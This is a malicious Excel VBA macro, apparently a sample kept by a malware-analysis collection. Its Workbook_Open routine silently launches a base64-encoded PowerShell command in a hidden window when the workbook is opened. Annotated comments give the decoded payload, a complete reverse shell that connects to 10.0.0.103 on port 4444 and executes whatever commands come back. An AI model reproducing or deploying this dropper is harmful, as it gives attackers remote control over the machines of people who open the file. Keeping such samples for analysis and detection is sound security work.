Attribute VB_Name = "|fffd||fffd||fffd||fffd|1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Sub Workbook_Open()
PSstring = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO"
PSstring = PSstring & "AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAA"
PSstring = PSstring & "LgAxADAAMwAiACwANAA0ADQANAApADsAIAANAAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABp"
PSstring = PSstring & "AGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsADQAKAA0ACgAkAGcAcgBlAGUAdABpAG4A"
PSstring = PSstring & "ZwAgAD0AIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAi"
PSstring = PSstring & "ADsADQAKACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkA"
PSstring = PSstring & "bgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABnAHIAZQBlAHQAaQBu"
PSstring = PSstring & "AGcAKQA7AA0ACgAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUA"
PSstring = PSstring & "LAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBh"
PSstring = PSstring & "AG0ALgBGAGwAdQBzAGgAKAApADsAIAANAAoAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAA"
PSstring = PSstring & "PQAgADAALgAuADIANQA1AHwAJQB7ADAAfQA7AA0ACgANAAoAdwBoAGkAbABlACgAKAAkAGkAIAA9"
PSstring = PSstring & "ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkA"
PSstring = PSstring & "dABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACAADQAKACQAZABhAHQAYQAg"
PSstring = PSstring & "AD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQA"
PSstring = PSstring & "ZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdABy"
PSstring = PSstring & "AGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7AA0ACgAkAHMAZQBuAGQAYgBhAGMA"
PSstring = PSstring & "awAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdABy"
PSstring = PSstring & "AGkAbgBnACkAOwANAAoAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMA"
PSstring = PSstring & "awAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIgA7"
PSstring = PSstring & "AA0ACgAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkA"
PSstring = PSstring & "bgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBj"
PSstring = PSstring & "AGsAMgApADsAIAANAAoAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIA"
PSstring = PSstring & "eQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAADQAK"
PSstring = PSstring & "ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7AA0ACgAkAGMAbABpAGUAbgB0AC4A"
PSstring = PSstring & "QwBsAG8AcwBlACgAKQA7AA=="
Shell ("powershell -W Hidden -encodedcommand " & PSstring)
End Sub

' InQuest injected base64 decoded content
' $client = New-Object System.
' et.Sockets.TCPClient("10.0.0
' .103",4444); 
' $stream = $cl
' ent.GetStream();
' $greetin
' g = "PS " + (pwd).Path + "> 
' $sendbyte = ([text.encodi
' ng]::ASCII).GetBytes($greeti
' $stream.Write($sendbyte
' , 0, $sendbyte.Length);$stre
' m.Flush(); 
' [byte[]]$bytes 
' = 0..255|%{0};
' while(($i 
'  $stream.Read($bytes, 0, $by
' tes.Length)) -ne 0){ 
' $data
' = (New-Object -TypeName Syst
' em.Text.ASCIIEncoding).GetSt
' ing($bytes,0, $i);
' $sendbac
' k = (iex $data 2>&1 | Out-St
' ing);
' $sendback2 = $sendbac
' k + "PS " + (pwd).Path + ">"
'  $sendbyte = ([text.encodi
' ng]::ASCII).GetBytes($sendba
' k2); 
'  $stream.Write($sendb
' yte, 0, $sendbyte.Length); 
'  $stream.Flush()};
' $client.
' Close();

INQUEST-PP=macro
